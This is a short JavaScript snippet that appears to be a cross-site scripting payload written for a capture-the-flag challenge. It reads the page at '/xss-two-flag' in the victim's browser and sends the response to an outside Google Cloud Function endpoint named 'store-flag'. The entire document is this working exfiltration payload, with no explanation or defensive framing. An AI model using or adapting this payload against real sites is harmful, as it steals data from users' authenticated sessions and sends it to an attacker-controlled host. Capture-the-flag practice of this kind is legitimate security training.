var xhr = new XMLHttpRequest()
xhr.open('GET','/xss-two-flag',true)
xhr.onload = function () {
	var request = new XMLHttpRequest()
	request.open('GET','https://us-central1-arboretum-backend.cloudfunctions.net/store-flag?flag=' + xhr.responseText,true)
	request.send()
}
xhr.send(null)